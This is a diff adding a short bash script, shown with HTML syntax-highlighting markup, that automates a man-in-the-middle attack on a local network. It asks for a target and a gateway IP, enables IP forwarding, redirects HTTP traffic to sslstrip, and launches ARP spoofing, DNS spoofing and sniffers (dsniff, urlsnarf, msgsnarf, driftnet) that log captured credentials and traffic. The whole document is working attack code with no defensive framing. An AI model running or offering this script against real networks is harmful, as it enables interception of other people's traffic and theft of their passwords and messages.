@@ -1,0 +1,20 @@
+<span class="co0">#!/bin/bash</span>
+<span class="co0">#this Skript use dsniff,arpspoff, driftnet, ssldump</span>
+&nbsp;
+<span class="re2">terminal</span>=<span class="st0">&quot;gnome-terminal -e &quot;</span>
+<span class="kw2">read</span> <span class="re5">-p</span> <span class="st0">&quot;What is your current interface: &quot;</span> int
+<span class="kw2">read</span> <span class="re5">-p</span> <span class="st0">&quot;What is your target computer ip addresse: &quot;</span> yip
+<span class="kw2">read</span> <span class="re5">-p</span> <span class="st0">&quot;What is your target gateway ip addresse: &quot;</span> gip
+&nbsp;
+<span class="co0">#Allow IP Forwarding </span>
+<span class="kw3">echo</span> <span class="nu0">1</span> <span class="sy0">&gt;</span> <span class="sy0">/</span>proc<span class="sy0">/</span>sys<span class="sy0">/</span>net<span class="sy0">/</span>ipv4<span class="sy0">/</span>ip_forward
+<span class="co0">#Port 80 Redirect to Port 10000</span>
+iptables <span class="re5">-t</span> nat <span class="re5">-A</span> PREROUTING <span class="re5">-p</span> tcp <span class="re5">--destination-port</span> <span class="nu0">80</span> <span class="re5">-j</span> REDIRECT <span class="re5">--to-ports</span> <span class="nu0">10000</span>
+<span class="co0">#Start sniffing with arpsniff</span>
+<span class="re1">$terminal</span> <span class="st0">&quot;sslstrip -l 10000 -w sslstrip.log&quot;</span> <span class="sy0">&amp;</span> 
+<span class="re1">$terminal</span> <span class="st0">&quot;arpspoof -i <span class="es2">$int</span> -t <span class="es2">$yip</span> <span class="es2">$gip</span>&quot;</span> <span class="sy0">&amp;</span>
+<span class="re1">$terminal</span> <span class="st0">&quot;dsniff -i <span class="es2">$int</span> -w dsniff.log &quot;</span> <span class="sy0">&amp;</span> 
+<span class="re1">$terminal</span> <span class="st0">&quot;dnsspoof -i <span class="es2">$int</span>&quot;</span>
+driftnet <span class="re5">-i</span> <span class="re1">$int</span> <span class="sy0">&amp;</span>
+<span class="re1">$terminal</span> <span class="st0">&quot;urlsnarf -i <span class="es2">$int</span>&quot;</span> <span class="sy0">&amp;</span> 
+<span class="re1">$terminal</span> <span class="st0">&quot;msgsnarf -i <span class="es2">$int</span>&quot;</span> <span class="sy0">&amp;</span>
